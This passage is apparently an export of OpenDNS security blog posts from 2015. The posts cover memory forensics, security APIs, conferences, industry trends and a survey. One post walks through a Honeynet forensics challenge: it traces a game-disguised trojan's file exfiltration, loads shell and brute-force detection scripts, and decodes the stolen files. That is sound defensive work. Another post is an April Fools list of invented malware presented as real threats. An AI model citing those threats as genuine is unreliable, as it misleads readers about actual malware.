(J-CAT)\nDutch authorities\nNational Cyber Investigative Joint Task Force – International Cyber Crime Coordination Cell (IC4)\nThe FBI\nIntel Security\nKaspersky\nShadowserver', 'Malware;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2015/04/10/operation-source-aaeh-botnet-takedown/');

This is one of the corner stones of the SIEM. By accumulating multiple sources of log data a richer and fuller picture can be developed. I like to break down sources of security data into four categories:\nsystem state including memory contents, registry entries, logged on users and more\nsystem disk including stored files and their locations, system or event logs and more\nrecorded network traffic and network IDS events/alerts and more\nthird party logs from systems providing services such as DHCP, firewall logs, and more\nIncident response often involves directly investigating a compromised system which typically focuses on the first two above categories. An investigation is typically started when an indicator of compromise is seen associated with a system within a network. Good responders don’t just wait for alerts to come to their inboxes, however. Forensics scanning frameworks are often used, similar to but differently scoped than vulnerability scanners and similar to but broader than antivirus scanners, to identify systems with suspicious configurations or states.\nAs much system data is volatile, many forensics examiners will prefer investigating a “live” system or one that has not ben powered off since the compromise. This is because malware is not running, network connections are not open, and attackers are not logged in when the system is off. All of these indicators can be collected from “live” systems and can be found within the system’s memory. Analyzing the memory of a system is most fruitful for determining current system state.\nAn Open Source Memory Analysis Framework\nEnter Rekall, a cross platform open source framework for analyzing system memory (from both “live” systems and memory dumps). Written in Python, Rekall came out of  branch of the Volatility project. It scans system memory for specific kernel structures and parses them. Structures include:\nsystem registry\nrunning processes\nopen network sockets\narp table entries\nmounted disks\nIt is incorporated into Google Rapid Response (GRR) a framework for deploying scalable forensics scanning of  large environments. Rekall has an extensible plugin architecture and comes with many useful plugins including Yara scanning of memory. The plugin architecture also allows for custom plugins.\nInvestigate Your Memory\nOne plugin that grabbed my interests was the dns_cache plugin for Windows systems. It scans the memory image loaded into Rekall for Microsoft’s dnsrslvr.dll library which is loaded by the svchost process. This DLL provides the DNS Caching Resolver Service which acts as a local DNS cache for the operating system.\nI added some logic to this dns_cache plugin to allow Rekall to send the domain names identified in the system’s DNS cache to OpenDNS’s Investigate API and display the categorization of the domain name from within Rekall. To use this new functionality download this fork of Rekall, drop in an Investigate API key, and install Rekall as shown here. For capturing an image of live memory from a running system, you’ll also need the winpmem kernel driver for accessing physical memory as a file (the SANS Internet Storm Center has a nice write up about it here).\nAn example of the results displayed by this DNS cache option are shown below:\n\nHappy hunting!', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/04/09/finding-malicious-connections-within-memory/');

And whether they like it or not, business executives are finding themselves involved in more IT security decisions. Executive involvement not only creates consensus (hopefully) in decisions and strategy, it boosts confidence. But when choosing between the growing number of security firms, API capability is not often enough a major factor in the decision—but it should be. They are the only hope for security stack interoperability and the key to the actionable information executives need when deciding security strategies.\nAccording to Richard Clarke, former special advisor to the president, C-level buy-in is critical for security preparedness. At a recent media event covered by eWeek, he discussed why it’s critical for companies to appoint a risk management committee. In fact, some companies are already shifting their security strategies to a risk model that heavily involves executives.\nAetna, Inc. is one example. After getting a wakeup call in 2009, the health insurance giant has evolved its IT security strategy. It now handles security as a business risk rather than individual IT issues that need fixes. Aetna CISO Jim Routh and his team analyze data feeds about potential threats from thousands of systems, then boil the data down to a single daily risk score. To get that daily risk score, Routh’s team has to filter massive amounts of data—and without APIs, those systems would potentially need to be analyzed individually.\nAPIs: The Internet’s Building Blocks\nSoftware developers use APIs as a sort of shortcut, as they make creating new apps, tools, and services much easier and drastically less expensive. If an engineering team doesn’t have the technical prowess or luxury of time to build a functional component to a new app, APIs from other vendors can be a lifesaver. They can also be more effective than developing a solution yourself. If you were trying to make an app in which a map would be critical, would you try to build a new map?\nKnown for investing in startups that scale on APIs, Accel Partner Rich Wong explains that it’s easier to add value if you’re not reinventing the software development wheel. In a recent interview, Wong commented, “You can outsource entire swatches of your company to very reliable APIs. Why would you go start your own payments capabilities, your own payment analytics, your own map capabilities when they’re so easily accessible from these other companies and are arguably better?”\nAPIs are so crucial and simultaneously commonplace in consumer tech that Accel Partners recently held a conference dedicated entirely to the new API marketplace. With a new investment strategy in what Accel calls APX, the venture capital firm is wagering they can create a viable business investing solely in startups that create “composites” by stitching together data from multiple APIs and making it into a new service or product.\nBut in the security industry, APIs are still somewhat uncommon—and when they do exist, they may only work with a small set of partner companies. This reality means if you don’t choose vendors carefully, your security team may as a result spend immense amounts of time fabricating ways to get their security stack to work together.\nObtaining the Smoking Gun\nFor incident response to work well, actionable information needs to be at the fingertips of investigators looking for it. This area is where APIs will play an increasingly crucial role for security teams. Multiple security solutions implemented to protect your network means sorting through a host of data feeds, dashboards, threat alerts, policy pages, and so on. APIs can stitch this immense stream of information and functionality together. But for many security companies right now, this doesn’t seem to be a priority.\nCompanies do seem to be waking up to this fact, however. Facebook recently acknowledged the power of sharing in security. In February the social media company launched ThreatExchange, a social platform for security professionals that conglomerates a collective knowledge from security experts and API threat feeds to assist the community in protecting their companies and customers.\nWithout API Sharing, You Cannot Keep Up\nUnfortunately, as OpenDNS CTO Dan Hubbard pointed out in a recent blog post, attackers are evolving much faster than the security industry. Attacks are becoming increasingly more frequent, more sophisticated, and even cheaper. An enterprise security team without C-level guidance working with a disintegrated security stack, a workforce that is increasingly more mobile, and an eroding network perimeter cannot keep up with the growing number of attacks.\nIf, as Clarke suggested in his comments, actionable information is the barrier to companies being prepared for attack, the key to obtaining that information is security solutions that have accessible APIs. The key to motivating security firms to develop them, according to Hubbard, is making it a demand during the purchasing process.\n“Customers have not yet been demanding APIs during the buying process,” Hubbard said. “That will start to change once more companies realize how important they are.”', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2015/04/09/why-apis-should-be-a-major-factor-in-your-security-buying-decisions/');

The coordination between teams has been seamless, from procurement, rack, stack, and provisioning.\nWouter Vanwalleghem, our Systems Engineer in Belgium, was on site to receive the equipment and coordinate with the facility. While at the site, it is Wouter’s role to ensure all the equipment is functional, installed, cabled, powered, and connected to our management network. From there, members of the infrastructure engineering group work together from San Francisco and Vancouver to finish the provisioning and finalize all of the network services.\nOur engineers use a wide variety of tools like Ansible, Puppet, NetHarbour, custom automation, and other provisioning support systems to automate as much of the build as possible. From start to finish, an entire site takes fewer than four days.\nAs we continue our accelerated pace of growth, OpenDNS will continue to grow its global presence. The incredible engineering teams of OpenDNS work tirelessly to ensure its users have the best experience possible. We process more than 70 Billion DNS Requests daily! That equates to more than 2 percent of the world’s Internet traffic! As the expansion continues, our global footprint marches on with it.\nWaiting for us to come to your region?

At the 23rd edition of the conference, happening later this April, participants will have the opportunity to join more than 350 sessions, keynotes, and seminars. They have a chance to participate in hands-on workshops and attend peer networking sessions and can visit the more than 400 company booths on the massive expo floor.\nBut despite the size of the event, some information security professionals see RSA as a chance to make uniquely personal connections and take stock of the impact that their own work can have on an industry. Dhia Mahjoub, senior security researcher at OpenDNS Security Labs, says that the RSA Conference gives him a unique opportunity for face-to-face interactions with colleagues from around the world and to see how the innovative security research he and peers work on everyday can be used to address modern information security challenges.\n“RSA is important for researchers because commercial products are the embodiment of the intense, continuous research that happens behind the scenes,” he said. “Most of the time, the research that we do is focused on solving problems that haven’t yet affected most people. We spend a lot of time on new research and innovative, visionary-type stuff. But our end goal as researchers is to protect people and corporations from online threats. Seeing how our work morphs into real products is enlightening. RSA is a chance to get a reality check”\nIn his role as security researcher at OpenDNS, Mahjoub works on research that applies a variety of analysis techniques to security threats ranging from botnets to banking trojans. In the last two years alone, he’s delivered 14 talks related to his research at events ranging from Kaspersky SAS to BlackHat. He is also part of the non-profit security research group MalwareMustDie, which helps track botnets and other malicious sources on the Internet.\nThough security researchers are often competing for mindshare and conference speaking slots, Mahjoub says that that the environment at RSA generally feels more open and collaborative than other big trade shows.\n“I’ve been to both RSA and Black Hat, and I feel that RSA is more pleasant. It’s all sales-y, and some people hate that… but it’s a mix,” he said. “RSA gives you a chance to visit all of the vendor booths and get an idea of what is going on across the entire industry. You can follow people on social media, but nothing beats seeing what is going on firsthand.”\nLast year’s RSA Conference broke several records for size and breadth. According to event organizers, over 28,000 attendees attended the 2014 show, which also featured more than 400 sessions in total. The unofficial RSA Parties Twitter handle is also tracking more than 70 parties and receptions happening during the week of the event. But despite the size of the crowds that these numbers suggest, many researchers see RSA as a chance reconnect with friends in a more relaxed atmosphere.\nAnthony Kasza, whose work as a security researcher with OpenDNS Labs also takes him to conferences around the world, says that RSA offers a unique opportunity for researchers to unwind with their peers.\n“RSA brings everyone together in one place, which is nice,” Kasza said. “I’m looking forward to interacting and talking with industry people I haven’t seen in a while or met before. As researchers we need to get out of our research boxes, unplug and interact once in a while with the products and companies in our industry. After-parties, follow-up Twitter chats and hallway conversations are typically even more beneficial than the presentations.”\nMahjoub agrees. “The private parties, mini-conferences, and meet-ups around RSA are a great opportunity to catch up with old information security friends and meet new ones in an informal setting,” he said. “We get to strengthen connections, build trust and plan future collaboration. Meeting old and new friends is also high on my to-do list and spending some quality time with them.”\nWhen it comes to the sessions, researchers often cite plans to attend talks given by friends with whom they share interests or talks covering topics related to what they encounter in their work. But even for hardcore researchers, RSA presents a once-a-year opportunity to get an overview of the most important topics facing the industry today.\n“Adi Shamir, Whit Diffie, and Martin Hellman—the legends are always around at RSA. The former NSA chief is even giving a talk. The cybersecurity journalists—people like Brian Krebs—those are the kinds of people I’m looking forward to hearing from,” Mahjoub said. “I do research on a daily basis, but I need to see the big picture. I need to see how I can position myself as a researcher in the world. I’m not just a researcher, I’m part of a community.”\nIf you’re interested in attending sessions and events hosted by OpenDNS during RSA Conference USA 2015, visit the OpenDNS at RSA webpage for more information.', 'Blog;Events', 'https://umbrella.cisco.com/blog/2015/04/07/rsa-research-real-world/');

I had a Sunday afternoon free and thought I’d give it a shot. I ended up completing most of the challenge. This blog serves as a walk through for my solution.\nNetwork Forensics\nI’ve talked about my approach to network forensics before and thought, “what better time to practice what I preach?”. First I read over the challenge page including each question to gather as much contextual information as possible. I made note of the superheros bonus question and kept it in the back of my head while working through the artifacts. The challenge provided a network trace file and a back story. The important details of the story were:\nJohn is your boss and his system was compromised at a BYOD conference\nPete Galloway responded to the compromise and then angrily quit the company\nPete found malware, Python bytecode, and “random” payloads during his triage\nThe first thing I typically do when analyzing network traffic is check the size of the trace file. If I can reasonably open it with Wireshark, I will. I like to use Wireshark to check two things about the trace file. The first is the number of connections broken down by protocol, which can be found by going to Statistics->Conversations. We can see about 150 TCP connections and 100 UDP connections.\n\nThe second thing is the protocols Wireshark thinks the trace contains. This can be accomplished by going to Statistics->Protocol Hierarchy. We can see most of the UDP is DNS making most of those 100 UDP connection fairly easy to understand. It should be noted that Wireshark determines the protocols by port number. This is a rather naive method and Wireshark’s listing should be taken with a grain of salt. Wireshark is a great tool for visually working with a relatively small number of streams, but I much prefer Bro. Bro isn’t as simple to use as Wireshark, though.\nTo get a full picture of the trace file’s contents I read the trace file with Bro and told Bro to use a custom configuration. I started by copying broctl’s default configuration file from %BRO_DIR%/bro/share/bro/site/local.bro. I enabled and disabled certain features and added an event handler for carving transferred files from the trace (and naming them with the protocol they were transferred over) and I set my local subnets to 0.0.0.0/0 (doing so makes Bro create additional log lines for every IP address in the trace file). Once finished the contents of my local.bro script looked like this:\n@load misc/loaded-scripts\n @load tuning/defaults\n @load misc/scan\n @load misc/app-stats\n @load misc/detect-traceroute\n @load frameworks/software/vulnerable\n @load frameworks/software/version-changes\n @load-sigs frameworks/signatures/detect-windows-shells\n @load protocols/ftp/software\n @load protocols/smtp/software\n @load protocols/ssh/software\n @load protocols/http/software\n @load protocols/dns/detect-external-names\n @load protocols/ftp/detect\n @load protocols/conn/known-hosts\n @load protocols/conn/known-services\n @load protocols/ssl/known-certs\n @load protocols/ssl/validate-certs\n @load protocols/ssl/log-hostcerts-only\n @load protocols/ssh/geo-data\n @load protocols/ssh/detect-bruteforcing\n @load protocols/ssh/interesting-hostnames\n @load protocols/http/detect-sqli\n @load frameworks/files/hash-all-files\nexport {\n redef Site::local_nets += [0.0.0.0/0];\n }\nevent file_new(f: fa_file)\n {\n local fname = fmt(\"%s_%s\", f$source, f$id);\n Files::add_analyzer(f, Files::ANALYZER_EXTRACT, [$extract_filename=fname]);\n }\nI then ran bro -Cr conference.pcapng local.bro and Bro generated a plethora of useful information I used as my inventory. The log files Bro generated for me where:\napp_stats.log\n dns.log\n files.log\n known_certs.log\n known_services.log\n packet_filter.log\n ssl.log\n x509.log\n conn.log\n http.log\n known_hosts.log\n loaded_scripts.log\n notice.log\n software.log\n weird.log\nBro also extracted all the files transfered within the trace file and dropped them into a directory for me which I named extract_files/.\nWith my Bro logs as my inventory, I first checked the conn.log file to get an overview of the connections in the trace file. Looking at the “service” field in the conn log as well as the name of the log files Bro created, we can see the trace file contains mostly HTTP and DNS traffic. It’s likely just web browsing. Looking in the dns.log file, you can see all the domain names queried for in the trace file and looking in the http.log file, you can see all the hosts and URLs John browsed to. Looking at the extracted files in extract_files/ whose names begin with “HTTP_” you can see all the HTML, javascript, and images transferred to and from on John’s system.\nUsing the http and dns logs and the extracted files, we can answer the first question, “BYOD seems to be a very interesting topic. What did your boss do during the conference?”. It seems John got on Facebook, Reddit, Gag9, and browsed to “www.thewayoftheninja.org” quite a bit during the conference. He was likely very productive.\nLooking closer at the http.log file, we can see “http://www.thewayoftheninja.org/n.html” was used as a referer in one HTTP connection, meaning John was likely redirected or linked there from “http://www.thewayoftheninja.org/n.html”. The host field for the connection is “www.harveycartel.org” and the file path John went to was “/nv2/Nv2-PC.zip”. This is interesting because it is supposedly a zip file. It is also interesting because about a minute after the zip file was downloaded an HTTP connection to “ninja-game.org” was made using a user-agent of “Python-urllib/2.7”. Recall Pete mentioned some interesting Python bytecode.\nLooking at the URL of the other connections made to “ninja-game.org”, we can see Windows file paths. This is very strange. You can also see the user-agent used in connections to “ninja-game.org” is “Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36”, a Mac user-agent while all the previous HTTP connections used “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36 “, a Windows user-agent. This lead me to believe the user-agent was crafted, likely by malware, likely inside that Zip file.\n\nThe next thing I did was check the mime types of all the files transferred in the trace file. I opened up the files.log file and noted an “application/x-dosexec” and an “application/x-shockwave-flash” file. These are both common file types often used in attacks so I honed in on them, especially the DOS executable file. But what happened to the Zip file? Bro and libmagic (the file command in Linux) both claim the file at “/nv2/Nv2-PC.zip” is an EXE even though the URL contained a Zip extension. I looked at the file with ExeInfo and  the Zip file turned out to be a self extracting archive.\nAt this point, we can answer the second question, “What method did the attacker use to infect your boss? Which systems (i.e. IP addresses) are involved?”. The attacker served back a malicious Zip file disguised as a game and John, working so diligently at his conference, ran it on his system. The file was served from 81.166.122.238, the same IP address the malware later in the trace file beacons to. We can also answer the third question, “Based on the PCAP, which files were exfiltrated? List the filenames.”. From the URLs in our http.log file:\nC:UsersadminDesktopsensitive+documents.doc\n C:UsersadminDesktopToolsodbg201help.pdf\n C:UsersadminDocumentsprivateaffairholidayEmiratesETicket1.pdf\n C:UsersadminDocumentsprivateaffairholidayEmiratesETicket2.pdf\nBased on the time the HTTP connections began we can answer question four, “Can you sketch an overview of the general actions performed by the malware?”. It seems John downloaded what he thought was just a game. Likely opened the file and ran some malware. John’s system issued a GET request for “ninja-game.org/highscores?user=admin”, likely downloaded a configuration or instructions file and then exfiltrated the above files from John’s system.\nHost Forensics and Malware Analysis\nThis is where network forensics ends and malware analysis/host forensics is needed. Moving the self extracting Zip to a previously configured malware analysis VM and opening it with 7zip, we can see the archive contains five files and a directory.\nmain.exe\n main.pyc\n n_v14.exe\n python27.dll\n start.cmd\n lib/\nOpening start.cmd with Notepad we can see how the malware is started. It seems n_v14.exe is the game John was hoping to play while main.exe is the malware. I began by examining main.pyc. Python compiles scripts before running them and stores the compiled version in pyc files. Similar to .NET assemblies, Python bytecode can be decompiled to the original source code quite easily. Using a library called Uncompyle, I decompiled the pyc file. It contained the following:\nimport sys\n sys.exit(\'rndebugger\ndetected.rnsignature:233f3f3b7164642c2424652c276431723a7d021e\')\nwhich answers the seventh question, “What does main.pyc do? (Bonus: Can you provide a decompiled version?)”. This makes me believe the main.exe file incorporates some anti debugging techniques. Looking at the strings in main.exe, we can see some references to Python including “Py_SetPythonHome”, “Could not load Python.”, and “import main”.\nThis makes me believe main.exe was originally written in Python and made into an EXE file with something similar to py2exe. It is likely main.pyc is a remnant of main.exe. This answers question six, “The malware seems to be written in Python. Is this “normal” Python? What’s different?” and also explains the Python user-agent we saw in the trace file.\nOpening main.exe in the freeware version of IDA and pressing Ctrl-E to locate the entry point, we see IDA found some TLS call backs in main.exe. These are likely used to detect the presence of debuggers. This was my somewhat thin answer to question eight, “How is the final payload protected? How is it decrypted by the dropper? (Bonus: Can you provide a decompiled version?)” as I didn’t completely reverse engineer main.exe. Instead, I treated main.exe as a blackbox.\nI executed main.exe with Fakenet running on my VM to attempt to recreate what happened on John’s system. My VM issued the same GET request I saw in the trace file to “ninja-game.org/highscores?user=admin”, except admin was replaced with the user account I was logged in as on my VM. Fakenet responded with its default HTML file. I was hoping to see POST requests exfiltrating data from my VM similar to the conference trace, but the malware issued no other network connections. I then replaced Fakenet’s default HTML file (which it serves to all requests by default) with the file the live server from the conference trace file responded to John’s system with and executed main.exe.\nAgain, I saw the GET request to “ninja-game.org/highscores?user=[USER_NAME]”, but this time I also saw POST requests to “ninja-game.org/submit_highscore?n=[FILE_PATH]” where the full path to some PDFs on my desktop replace [FILE_PATH]. I then carved the data the malware POSTed to Fakenet and compared the original PDFs on my desktop to the exfiltrated data in the malware’s POST request.\n\nThe size of the two files were the same. I assumed the file was either encoded or encrypted. Comparing the contents of the two files in HxD, I noticed that all 0x20 bytes in the original document mapped to 0x6F. I checked other bytes from the original PDF and they seemed to all be substituted in the encoded version.\n\nDecoding John’s Exfiltrated Files\nI assumed the encoded file was simply an xOR’d version of the original PDF and tried decoding the encoded version with 0x4F (0x20 ^ 0x6F), but found that xOR key wasn’t used to encode all bytes of the original file. I was a little stumped at this point. I considered other simple methods of encoding including:\na caesarian shift\na modulus function that depended on the input byte\na hard coded substitution scheme\nThe solution then came to me. As I said previously, I treated main.exe as a blackbox and didn’t worry about the actual encoding functionality within main.exe. Using some basic Python I crafted a fake PDF and placed it on my desktop for the malware to steal and POST. My Python script follows:\nwith open(\'./crafted.pdf\', \'wb\') as f:\n for each in range(0xff + 1):\n f.write(\"%c\" % each)\nThis creates a file with bytes 0x00 through 0xFF and names it with a PDF extension. I then started Fakenet and again executed main.exe. The malware issued a GET request for “ninja-game.org/highscores?user=[USER_NAME]”, Fakenet served back the original server’s response, the malware found the crafted PDF on my desktop, encoded it and included it in a POST body which was intercepted by Fakenet. Carving the encoded file POST’d by the malware from a PCAP Fakenet wrote for me, I had a copy of every byte 0x00 through 0xFF and that byte’s corresponding encoded version. I then used more Python scripting to construct a dictionary mapping encoded bytes to decoded bytes and used that dictionary to decode the encoded PDF and DOC files exfiltrated from John’s system and carved from the conference.pcapng file. The decoding script follows:\n# This builds the decoding dictionary from the encoded crafted PDF\n d = {}\n count = 0x00\n byte = \'x01\'\n with open(\'./crafted_ecoded.pdf\', \'rb\') as f:\n while byte != \"\":\n byte = f.read(1)\n if byte == \"\":\n continue\n foo = ord(byte)\n d[foo] = count\n count += 1\n# This decodes the a single file carved from the malware\'s POST requests in the original challenge pcap\n byte = 1\n with open(\'./doc_encoded.doc\', \'rb\') as en:\n with open(\'./doc_decoded.doc\', \'wb\') as de:\n while byte != \"\":\n byte = en.read(1)\n if byte == \"\":\n continue\n foo = d[ord(byte)]\n de.write(\"%c\" % foo)\nAfter decoding John’s PDFs and DOC files, I opened them. The PDFs contained plane tickets to Dubai in John’s and Pete’s wife’s name. This is likely why Pete was so mad and quit the company. This was the answer to question nine, “Why did Pete leave the company?”. The answer to question ten, “Your boss mentioned he’s going to the Honeynet Workshop in Stavanger, but you’re not allowed to join him. Why so?” was also in the PDFs. The reservations for Dubai are for the same date as the Honeynet Workshop.\n\nInterestingly enough, John was likely already compromised before this incident as the word document on his desktop contained a malicious macro which dropped this EXE in his TEMP folder.\nConsidering the bonus question, the only super heros I found were in images extracted from John’s browsing.\nFinally, the somewhat subjective question five, “Do you think this is a targeted or an automated attack? Why?” can be answered. I believe the attack to be automated and not targeted. The malware seems to grab any PDF or DOC file on the Desktop or in the user’s documents folder in alphabetical order (I noticed this when it exfiltrated a temporary file I created, “a_crafted.pdf”, before “crafted.pdf”. The malware isn’t looking for anything specific besides files with specific extensions. The malware is not targeting John’s files specifically. However, depending on how the attacker delivered the malware and whether or not the malware was delivered to anyone else at the conference, the attacker *could have* been targeting John.\nFinal Thoughts\nI had a lot of fun working this challenge and I learned quite a bit about EXE files generated from Python and thread-local storage techniques. I’m always looking for opportunities to use Bro, as well, and this was a good one. I want to thank Thomas and Maximilian for putting the challenge materials together as well as the Honeynet Project. If anyone else found the superheros, I’d love to here where.', 'Incident Response;Open Source;Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2015/04/07/honeynet-weird-python/');

It came and it went just like it has for the past 22 years; without me there. My scene is the security scene – Black Hat over SxSW, but even hackers can appreciate an epic party now and again, right?\nIn fairness to the SxSW crowd, privacy and online security did win “Trend of the Event” at the SxSW Interactive Awards in 2014 stemming from talks by Edward Snowden, Glenn Greenwald and Julian Assange. Yet just 12 months later the festival’s security trend transitioned into a bonafide theme in 2015 making numerous appearances across the event’s vast schedule.\nYahoo unveiled its new end-to-end encrypted email service. The CTO of Decoded led a workshop where he taught attendees how to hack their personal laptops. And Edward Snowden showed up again (via teleconference) to lead a secret session on how businesses need to come together and beef up their defenses against government surveillance.\nFrom the sound of it, cybersecurity had a seat on the main stage at this year’s SxSW. Historically speaking this is somewhat mind-blowing. We’ve reached a tipping point where online security was addressed more seriously than just a token handwave. This is good news for security professionals. For us, we know security needs to be a part of every conversation.\nMaybe we should thank Seth Rogen, a few Sony executives, President Obama and some alleged North Korean hackers. These are the players who very publicly yanked cybersecurity out from underneath a symbolic dark colored hoodie and landed it across major news outlets for almost two straight months. They made it a current, relevant issue. They made it a debate. They spread fear across corporate America. Let’s be honest. What executive didn’t weigh the bone-chilling impact from a similar incident happening to his or her company?\nThe Sony hack was a catalyst to a new normal — like it or not, every business is a security company now. Whether you build technology or provide services to consumers or other businesses…you are a security company. If there is information inside your company you would never want disclosed…you are a security company. If your business collects and stores personal or confidential data of any kind regardless of your vertical…you are a security company. It’s a fact. Your business is going to get attacked and the threats will only get more sophisticated. In the last week alone, both Slack and GitHub disclosed attacks on their networks. In each case the motivation was different. It happens every day.\nAs a business, you can expect this new normal to dictate more invasive legislation and responsibilities. For example, in a recent Wall Street Journal article, writer Ben DiPietro reports that Boards of Directors are now being held responsible for cybersecurity. According to the article, U.S. regulators this year are emphasizing the importance for corporate boards to take responsibility for cybersecurity, saying directors and officers who fail to do so could be held individually liable for any lapses that occur. The article goes on to say that particularly in the last three to four months there has been intense focus by regulators on this subject, largely directed to directors and officers.\nNetwork security also is transitioning into a significant corporate strategy demanding more commitment from executive leadership teams. Steven Norton, another Wall Street Journal reporter, recently covered a survey of 100 CFOs from technology companies. In addition to finding that CFOs are increasing security spending as they buy up new security solutions and develop ways to respond to breaches, the survey highlights how CFOs are taking on a growing role in the cybersecurity discussion.\nBoDs and C-level executives strategizing on cybersecurity. Definitely a shift.\nMore than anything else, this new normal will force us to think differently (yes I went there) about security measures and who is responsible for applying them. If we all think like security companies, we will design and build security literally everywhere — chipsets, firmware, operating systems, databases, middleware… you get the idea.\nThe thinkers are already stepping up. MIT just launched 3 new cybersecurity initiatives that will pool expertise from across the institution to better characterize the security dynamics of large networked systems, with the aim of guiding policymakers. The intent is to enforce security systematically and build technology infused with “security by default.”\nIntel is also paving the way. Giulio Prisco from Bitcoin Magazine, uncovered a recently listed job posting indicating that the chipmaker is planning to investigate the potential of blockchain technology. In describing the desired job applicant, Intel is searching for a researcher qualified in the areas of crypto algorithms, access control models and security/privacy protocols, proficient in the development of system and application software and familiar with relevant security and cryptographic standards. According to Prisco, it appears that Intel intends to focus on the security-related aspects of blockchain algorithms, possibly in view of the implementation of appropriate security frameworks in future Intel chips.\nThe sooner we embrace this new normal the better. Stop pointing blame at the players lower down the stack or higher up in the cloud. We are all security companies responsible for protecting our employees and customers. Legitimate businesses can no longer rely on ‘patch and pray’ strategies, but have to think differently about the security technology they build, invest in and deploy. To quote Marc Andreessen from his A16z Podcast: Security’s Painful Prominence and Why There is No Turning Back, “I think from a technology standpoint, businesses need to either become first class at security, with first-class expertise and first-class funding, or they need to work with vendors such as cloud and SaaS vendors who are.”\nWord.', 'Blog;Community;Security 101', 'https://umbrella.cisco.com/blog/2015/04/02/the-new-normal-were-all-security-companies-now/');

Voters are not limited to a single choice—they can pick an unlimited number of sessions and even change votes until April 2nd. The top 25 sessions by vote total will then go on a shortlist that the RSA session judges will use to make final selections.\nHere’s a quick rundown of the talk submissions from OpenDNS Security Labs researchers:\nOne crowdsourced submission for this year comes from Jeremiah O’Connor, security researcher at OpenDNS. Titled “NLP for APT via DNS,” O’Connor plans to discuss a new, advanced threat detection model that uses natural language processing techniques to identify malicious domains in the wild. Discussed previously on this blog, NLPRank uses natural language processing coupled with HTML analysis and ASN mapping across billions of DNS records to predict both opportunistic phishing campaigns and attacks directed at high-value targets.\nO’Connor says that one of the things that he’s excited to discuss at RSA is the progress he’s made on operationalizing NLPRank. In a conversation late last week, O’Connor talked about working with OpenDNS Research Labs senior security researcher Dhia Mahjoub to set up a review pipeline that can automatically filter out the false positives highlighted by his original algorithm.\nAndrew Hay, director of security research at OpenDNS Security Labs submitted two sessions for the RSA crowdsourced track.

We look at our extensive data collection network built on top of a very large security infrastructure and use this data to predict what’s coming next.  We’re a team of world-class engineers, mathematicians, and security researchers, and we’re taking an innovative and proactive approach to security research. It’s often stated that being a DNS company puts us in a bleeding edge position from a security standpoint as we are able to harness tons of data regarding internet activity and discover and predict new and interesting threats by analyzing patterns in the data that we receive. When you’re the tip of the spear, you end up running into a lot of new and unique threats that are unrecognized throughout the security community. Listed are a few of the top recognized unique threats in Q1 of 2015:\n\nWin32.Siesta\nA simple botnet attack that spreads by infecting all EXE files found in drives C to Z, which then causes your computer to slow down considerably (almost as if it’s in ‘sleep’ mode) consistently between the hours of 2pm and 4pm CST. This botnet infection was discovered by OpenDNS Labs early this year, however further investigation would reveal that this attack has been around for much longer. The location of this attack reportedly originated in Mexico, the Mediterranean and also certain parts of Southern Europe.\nFacebook.Access.Recursion Trojan (Win.32/F.arT)\nA malicious script (popularly referred to as the Trojan Malodorous) designed to hijack Facebook activity, this Trojan is usually seen in web pages that perform “click-jacking,” forcing users to “like,” share” or “comment” on pages in Facebook without their knowledge. It has been reported that many who are infected with this malware tend to, for whatever reason, deny it’s existence and proclaim that it must have come from someone else’s computer. While OpenDNS protects against this threat, it’s also been mythicized that lighting a match and blowing it out near the infected computer will mostly mask the effects of the Trojan.\n\nPaleo Botnet\nA direct derivative of the Palveo botnet, this attack works in a very similar fashion. It is a standard botnet that, once executed, creates registry entries to ensure that it runs every time Windows starts. The worm then crossfit’s a back door on the compromised computer and attempts to connect to an IRC server to receive commands, such as oddly deleting any files containing the words “Dairy,” “Grains” or “Alcohol.” This attack was initially created with the intention of improving the computer’s overall status, appearance, and to give the Network Admin something to talk about at social events, however it has since been declared an annoying nuisance by many computer scientists.\nCryptoWhopper\nNew variants of Ransomware Trojans are still actively being created and released, as many other security solutions do not have an answer for this particular variety of malware. When activated, CryptoWhopper encrypts certain types of files stored on local and mounted network drives using RSA public-key cryptography, with the private key stored only on the malware’s control servers. The malware then displays a message which offers to decrypt the data if a burger is eaten by the stated deadline, and also threatens to delete the private key if the deadline passes.\n\nStay tuned for our detailed report on each of the aforementioned advanced paradigm-shifting cyber threats.', 'Announcements;Security Research', 'https://umbrella.cisco.com/blog/2015/04/01/new-malware-attacks-on-the-threat-horizon/');

But in addition to these previously-discussed IT networking insights, the study shines a light into the mindset of decision-makers who are tackling the security challenges posed by an increasingly mobile and distributed workforce.\nKey to understanding the report’s findings is first understanding the gradually decreasing emphasis on the traditional hub-and-spoke wide area network (WAN) model. Mobile work is on the rise and security professionals know that network protection needs to be extended to the branch offices at the far corners of their organization. The study’s authors say that not only is the traditional hub-and-spoke networking approach no longer the preferred method for connecting a distributed workforce, but cost and performance issues will actually prevent future IT decision-makers from switching back to a hub-and-spoke topology.\nAdditionally, survey results now show that hub-and-spoke networks can actually create security roadblocks for many organizations. According to the Forrester survey, IT security decision-makers have identified a number of shortcomings in traditional hub-and-spoke networks, ranging from the aforementioned IT costs and increased policy complexity to performance issues due to latency.\nWhile economic concerns are pushing companies toward more open branch office connections, providing security for these connections is an increasingly worrisome issue. According to the report’s authors, a historic number of high-profile data breaches in 2014 is causing companies to provide heavier investment in network security. They also state that companies are increasingly looking for approaches that make sure these direct connections don’t become easy footholds for attackers to gain access to a company’s network.\nSurvey data show that when it comes to security service adoption, IT professionals highly value speed of deployment, improved protection and round-the-clock coverage. Interestingly, the pricing model of as-a-service offerings and reduced capital expenditures are also ranked as important reasons for adoption SaaS offerings, indicating that cost is not only driving organizations with multiple branches away from hub-and-spoke networks, but into the cloud. The report’s authors also highlighted that security professionals are looking for technologies that “free them from hardware appliances, provide unified visibility, and take advantage of collective threat intelligence.”\n\nFor more information, and to read the full study, check out the full Forrester Technology Adoption Profile on the OpenDNS website.', 'Announcements;Blog', 'https://umbrella.cisco.com/blog/2015/03/31/survey_cloud-based_security/');

